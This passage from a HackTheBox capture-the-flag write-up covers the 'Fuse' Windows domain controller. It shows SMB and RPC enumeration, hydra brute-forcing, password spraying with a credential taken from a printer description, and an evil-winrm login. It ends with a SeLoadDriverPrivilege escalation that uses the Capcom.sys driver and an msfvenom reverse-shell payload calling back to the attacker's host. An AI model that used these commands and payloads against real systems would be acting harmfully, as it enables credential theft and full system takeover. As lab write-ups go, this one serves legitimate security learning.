593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-09-09T16:35:42
|_  start_date: 2023-09-09T15:42:29
|_clock-skew: mean: 2h32m23s, deviation: 4h02m30s, median: 12m22s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Fuse
|   NetBIOS computer name: FUSE\x00
|   Domain name: fabricorp.local
|   Forest name: fabricorp.local
|   FQDN: Fuse.fabricorp.local
|_  System time: 2023-09-09T09:35:41-07:00
</code></pre><ul><li><code>smb</code></li></ul><pre tabindex=0><code>└─$ smbclient -N -L //10.10.10.193                                                    
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.193 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
</code></pre><ul><li><code>ldapsearch</code></li></ul><pre tabindex=0><code>└─$ ldapsearch -H ldap://10.10.10.193 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base &lt;&gt; (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=fabricorp,DC=local
namingContexts: CN=Configuration,DC=fabricorp,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=fabricorp,DC=local
namingContexts: DC=DomainDnsZones,DC=fabricorp,DC=local
namingContexts: DC=ForestDnsZones,DC=fabricorp,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
</code></pre><pre tabindex=0><code>└─$ ldapsearch -H ldap://10.10.10.193 -x -b &#34;DC=fabricorp,DC=local&#34;
# extended LDIF
#
# LDAPv3
# base &lt;DC=fabricorp,DC=local&gt; with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A6C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v3839

# numResponses: 1
</code></pre><ul><li><code>rpc</code></li></ul><pre tabindex=0><code>└─$ rpcclient -U &#34;&#34; -N 10.10.10.193
rpcclient $&gt; querydispinfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $&gt; enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $&gt; 
</code></pre><ul><li>Web Server</li></ul><p><img src=./images/1.png alt></p><ul><li><code>gobuster</code> found nothing</li></ul><h2 id=foothold>Foothold</h2><ul><li>We can check the print logs<ul><li>And we the usernames which we can use for brute forcing</li></ul></li></ul><p><img src=./images/2.png alt></p><pre tabindex=0><code>administrator
bhult
pmerton
tlavel
sthompson
</code></pre><ul><li>So the only thing left is to try brute-forcing<ul><li>Let&rsquo;s generate a password list</li></ul></li></ul><pre tabindex=0><code>└─$ cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers &gt; cewl.list
</code></pre><pre tabindex=0><code>└─$ hydra -L users.list -P cewl.list fuse.fabricorp.local smb
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-09 20:41:50
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 850 login tries (l:5/p:170), ~850 tries per task
[DATA] attacking smb://fuse.fabricorp.local:445/
[STATUS] 141.00 tries/min, 141 tries in 00:01h, 709 to do in 00:06h, 1 active
[445][smb] Host: 10.10.10.193 Account: bhult Valid password, password expired and must be changed on next logon
[445][smb] host: fuse.fabricorp.local   login: bhult   password: Fabricorp01
[STATUS] 161.33 tries/min, 484 tries in 00:03h, 366 to do in 00:03h, 1 active
[445][smb] Host: 10.10.10.193 Account: tlavel Valid password, password expired and must be changed on next logon
[445][smb] host: fuse.fabricorp.local   login: tlavel   password: Fabricorp01
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-09 20:47:02
</code></pre><ul><li>If we try to check <code>smb</code> with the new creds, we have a <code>NT_STATUS_PASSWORD_MUST_CHANGE</code></li></ul><pre tabindex=0><code>└─$ smbclient -U bhult -L \\10.10.10.193 
Password for [WORKGROUP\bhult]:
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
</code></pre><pre tabindex=0><code>└─$ smbclient -U tlavel -L \\10.10.10.193
Password for [WORKGROUP\tlavel]:
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
</code></pre><ul><li>I set the new password and checked <code>smb</code> again</li></ul><pre tabindex=0><code>└─$ impacket-smbpasswd fabricorp.local/tlavel:Fabricorp01@10.10.10.193 -newpass &#39;P@ssw0rd!!!&#39;
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] Password is expired, trying to bind with a null session.
[*] Password was changed successfully.
</code></pre><pre tabindex=0><code>└─$ smbmap -u tlavel -p &#39;P@ssw0rd!!!&#39; -H 10.10.10.193 -R &#39;&#39;
[+] IP: 10.10.10.193:445        Name: fuse.fabricorp.local                              
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        HP-MFT01                                                NO ACCESS       HP-MFT01
        IPC$                                                    READ ONLY       Remote IPC
        .\IPC$\*
        fr--r--r--                3 Sun Dec 31 23:58:45 1600    InitShutdown
        fr--r--r--                4 Sun Dec 31 23:58:45 1600    lsass
        fr--r--r--                3 Sun Dec 31 23:58:45 1600    ntsvcs
        fr--r--r--                3 Sun Dec 31 23:58:45 1600    scerpc
        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-36c-0
        fr--r--r--                3 Sun Dec 31 23:58:45 1600    epmapper
        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-1e4-0
        fr--r--r--                3 Sun Dec 31 23:58:45 1600    LSM_API_service
        fr--r--r--                3 Sun Dec 31 23:58:45 1600    eventlog
        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-3e0-0
        fr--r--r--                4 Sun Dec 31 23:58:45 1600    wkssvc
        fr--r--r--                3 Sun Dec 31 23:58:45 1600    atsvc
...
   dr--r--r--                0 Sat May 30 00:29:21 2020    ..
        fr--r--r--               22 Sat May 30 00:29:21 2020    GPT.INI
        dr--r--r--                0 Sat May 30 00:29:21 2020    MACHINE
        dr--r--r--                0 Sat May 30 00:29:21 2020    USER
        .\SYSVOL\fabricorp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
        dr--r--r--                0 Sat May 30 00:29:21 2020    .
        dr--r--r--                0 Sat May 30 00:29:21 2020    ..
        dr--r--r--                0 Sat May 30 00:29:21 2020    Microsoft
        .\SYSVOL\fabricorp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
        dr--r--r--                0 Sat May 30 00:29:21 2020    .
        dr--r--r--                0 Sat May 30 00:29:21 2020    ..
        dr--r--r--                0 Sat May 30 00:29:21 2020    Windows NT
        .\SYSVOL\fabricorp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
        dr--r--r--                0 Sat May 30 00:29:21 2020    .
        dr--r--r--                0 Sat May 30 00:29:21 2020    ..
        fr--r--r--               22 Sat May 30 00:47:55 2020    GPT.INI
        dr--r--r--                0 Sat May 30 00:29:21 2020    MACHINE
        dr--r--r--                0 Sat May 30 00:29:21 2020    USER
        .\SYSVOL\fabricorp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
        dr--r--r--                0 Sat May 30 00:29:21 2020    .
        dr--r--r--                0 Sat May 30 00:29:21 2020    ..
        dr--r--r--                0 Sat May 30 00:29:21 2020    Microsoft
        .\SYSVOL\fabricorp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
        dr--r--r--                0 Sat May 30 00:29:21 2020    .
        dr--r--r--                0 Sat May 30 00:29:21 2020    ..
        dr--r--r--                0 Sat May 30 00:29:21 2020    Windows NT
</code></pre><ul><li>Nothing interesting on <code>smb</code><ul><li>Let&rsquo;s check <code>rpc</code><ul><li>Note: password will be reset again, so we have to change it again</li></ul></li></ul></li></ul><pre tabindex=0><code>└─$ rpcclient -U &#34;tlavel&#34; -N 10.10.10.193 --password=&#39;P@ssw0rd123&#39;                    
rpcclient $&gt; querydispinfo
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x109c RID: 0x1db2 acb: 0x00000210 Account: astein       Name: (null)    Desc: (null)
index: 0x1099 RID: 0x1bbd acb: 0x00020010 Account: bhult        Name: (null)    Desc: (null)
index: 0x1092 RID: 0x451 acb: 0x00020010 Account: bnielson      Name: (null)    Desc: (null)
index: 0x109a RID: 0x1bbe acb: 0x00000211 Account: dandrews     Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x109d RID: 0x1db3 acb: 0x00000210 Account: dmuir        Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xff4 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x109b RID: 0x1db1 acb: 0x00000210 Account: mberbatov    Name: (null)    Desc: (null)
index: 0x1096 RID: 0x643 acb: 0x00000210 Account: pmerton       Name: (null)    Desc: (null)
index: 0x1094 RID: 0x641 acb: 0x00000210 Account: sthompson     Name: (null)    Desc: (null)
index: 0x1091 RID: 0x450 acb: 0x00000210 Account: svc-print     Name: (null)    Desc: (null)
index: 0x1098 RID: 0x645 acb: 0x00000210 Account: svc-scan      Name: (null)    Desc: (null)
index: 0x1095 RID: 0x642 acb: 0x00000010 Account: tlavel        Name: (null)    Desc: (null)
</code></pre><ul><li>We saw a printer service on port <code>80</code>, so let&rsquo;s check printers</li></ul><pre tabindex=0><code>rpcclient $&gt; enumprinters
        flags:[0x800000]
        name:[\\10.10.10.193\HP-MFT01]
        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
        comment:[]

rpcclient $&gt; 
</code></pre><ul><li>And we have some creds<ul><li>Let&rsquo;s password spray</li></ul></li></ul><pre tabindex=0><code>└─$ crackmapexec smb 10.10.10.193 -u users.list -p &#39;$fab@s3Rv1ce$1&#39; --continue-on-success
SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\Administrator:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\astein:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\dandrews:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\DefaultAccount:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\dmuir:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\Guest:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\krbtgt:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\mberbatov:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\pmerton:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\sthompson:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 
SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-scan:$fab@s3Rv1ce$1 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE
</code></pre><ul><li>If we test for <code>winrm</code>, we see that <code>svc-print</code> has permissions</li></ul><pre tabindex=0><code>└─$ crackmapexec winrm 10.10.10.193 -u users.list -p &#39;$fab@s3Rv1ce$1&#39; --continue-on-success
SMB         10.10.10.193    5985   FUSE             [*] Windows 10.0 Build 14393 (name:FUSE) (domain:fabricorp.local)
HTTP        10.10.10.193    5985   FUSE             [*] http://10.10.10.193:5985/wsman
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\Administrator:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\astein:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\bhult:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\bnielson:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\dandrews:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\DefaultAccount:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\dmuir:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\Guest:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\krbtgt:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\mberbatov:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\pmerton:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\sthompson:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\svc-scan:$fab@s3Rv1ce$1
WINRM       10.10.10.193    5985   FUSE             [-] fabricorp.local\tlavel:$fab@s3Rv1ce$1
</code></pre><ul><li><code>winrm</code></li></ul><pre tabindex=0><code>└─$ evil-winrm -u &#39;fabricorp.local\svc-print&#39; -p &#39;$fab@s3Rv1ce$1&#39; -i 10.10.10.193
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-print\Documents&gt;
</code></pre><h2 id=root>Root</h2><ul><li><code>whoami</code></li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\svc-print\Documents&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeLoadDriverPrivilege         Load and unload device drivers Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc-print\Documents&gt; whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
FABRICORP\IT_Accounts                      Group            S-1-5-21-2633719317-1471316042-3957863514-1604 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
*Evil-WinRM* PS C:\Users\svc-print\Documents&gt; tasklist
tasklist.exe : ERROR: Access denied
    + CategoryInfo          : NotSpecified: (ERROR: Access denied:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

*Evil-WinRM* PS C:\Users\svc-print\Documents&gt; sc.exe query
[SC] OpenSCManager FAILED 5:

Access is denied.
</code></pre><ul><li>We have <code>SeLoadDriverPrivilege</code><ul><li>We can follow steps from the <a href=https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/ target=_blank rel=noopener>post</a></li><li>I&rsquo;ll create the payload first</li></ul></li></ul><pre tabindex=0><code>└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.9 LPORT=6666 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
</code></pre><ul><li>Now, we need to compile <a href=https://github.com/tandasat/ExploitCapcom/tree/master target=_blank rel=noopener>ExploitCapcom</a> and <a href=https://github.com/TarlogicSecurity/EoPLoadDriver/ target=_blank rel=noopener>Eoploaddriver</a><ul><li>We also need <a href=https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys target=_blank rel=noopener>Capcom.sys</a></li><li>First we have to modify <code>ExploitCapcom</code> source code, so that it points to our payload<ul><li>Set project to <code>Release</code> and <code>x64</code> then build it</li></ul></li></ul></li></ul><p><img src=./images/3.png alt></p><ul><li>Then we have to also build our <code>Eoploaddriver</code><ul><li>Create a new project</li><li>Copy and paste the code from <a href=https://github.com/TarlogicSecurity/EoPLoadDriver/ target=_blank rel=noopener>Eoploaddriver</a></li><li>Set project to <code>Release</code> and <code>x64</code></li><li>Build it</li></ul></li></ul><p><img src=./images/4.png alt></p><p><img src=./images/5.png alt></p><ul><li>Now we have all files we need</li></ul><p><img src=./images/6.png alt></p><ul><li>After uploading the files to target box, we need to run <code>EoPLoadDriver</code> that we compiled<ul><li>It will enable <code>SeLoadDriverPrivilege</code></li><li>Create a registry key with setting we need</li><li>And execute <code>NTLoadDriver</code>, which will load the driver from the registry we created</li></ul></li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\svc-print\Documents&gt; .\EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Users\svc-print\Documents\Capcom.sys
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService
NTSTATUS: 00000000, WinError: 0
</code></pre><ul><li>Then we run the exploit driver</li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\Users\svc-print\Documents&gt; .\ExploitCapcom.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000080
[*] Shellcode was placed at 000001F7B1FD0008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program
</code></pre><ul><li>And if we check listener, we now have our shell</li></ul><p><img src=./images/7.png alt></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
<a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2ffuse%2f&text=%5bHTB%5d%20Machine%3a%20Fuse&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i></a>
<a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2ffuse%2f&title=%5bHTB%5d%20Machine%3a%20Fuse" target=_blank><i class="fab fa-reddit"></i></a>
<a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2ffuse%2f&title=%5bHTB%5d%20Machine%3a%20Fuse" target=_blank><i class="fab fa-linkedin"></i></a>
<a class="btn btn-sm email-btn" href="mailto:?subject=%5bHTB%5d%20Machine%3a%20Fuse&body=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2ffuse%2f" target=_blank><i class="fas fa-envelope-open-text"></i></a></div><div class="col-md-6 btn-improve-page"><a href=https://github.com/umarbaevB/umarbaevb.github.io/edit/main/content/posts/cybersecurity/hackthebox/machines/windows/fuse/index.md title="Improve this page" target=_blank rel=noopener><i class="fas fa-code-branch"></i>
Improve this page</a></div></div><hr><div class="row next-prev-navigator"><div class="col-md-6 previous-article"><a href=/posts/cybersecurity/hackthebox/machines/windows/forest/ title="[HTB] Machine: Forest" class="btn btn-outline-info"><div><i class="fas fa-chevron-circle-left"></i> Prev</div><div class=next-prev-text>[HTB] Machine: Forest</div></a></div><div class="col-md-6 next-article"><a href=/posts/cybersecurity/hackthebox/machines/windows/giddy/ title="[HTB] Machine: Giddy" class="btn btn-outline-info"><div>Next <i class="fas fa-chevron-circle-right"></i></div><div class=next-prev-text>[HTB] Machine: Giddy</div></a></div></div><hr></div></div></div><a id=scroll-to-top class=btn><i class="fas fa-chevron-circle-up"></i></a></section><section class=toc-section id=toc-section><div class=toc-holder><h5 class="text-center pl-3">Table of Contents</h5><hr><div class=toc><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#root>Root</a></li></ul></nav></div></div></section></div><footer id=footer class="container-fluid text-center align-content-center footer pb-2"><div class="container pt-5"><div class="row text-left"><div class="col-md-4 col-sm-12"><h5>Navigation</h5><ul><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#about>About</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#skills>Skills</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#education>Education</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#projects>Projects</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#achievements>Courses and Events</a></li></ul></div><div class="col-md-4 col-sm-12"><h5>Contact me:</h5><ul><li><a href=mailto:hrafnulf13@gmail.com target=_blank rel=noopener><span><i class="fas fa-envelope"></i></span> <span>hrafnulf13@gmail.com</span></a></li><li><a href=https://github.com/umarbaevB target=_blank rel=noopener><span><i class="fab fa-github"></i></span> <span>umarbaevB</span></a></li></ul></div></div></div><hr><div class=container><p id=disclaimer><strong>Liability Notice:</strong> This theme is under MIT license. So, you can use it for non-commercial, commercial, or private uses. You can modify or distribute the theme without requiring any permission from the theme author. However, the theme author does not provide any warranty or takes any liability for any issue with the theme.</p></div><hr><div class=container><div class="row text-left"><div class=col-md-4><a id=theme href=https://github.com/hugo-toha/toha target=_blank rel=noopener><img src=/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_3.png alt="Toha Theme Logo">
Toha</a></div><div class="col-md-4 text-center">© 2020 Copyright.</div><div class="col-md-4 text-right"><a id=hugo href=https://gohugo.io/ target=_blank rel=noopener>Powered by
<img src=/images/hugo-logo.svg alt="Hugo Logo" height=18></a></div></div></div></footer><script src=/application.6ea41b538638987eca0365babdf28c3aa16adbc59643343c39865362e701c943.js integrity="sha256-bqQbU4Y4mH7KA2W6vfKMOqFq28WWQzQ8OYZTYucByUM=" defer></script></body></html>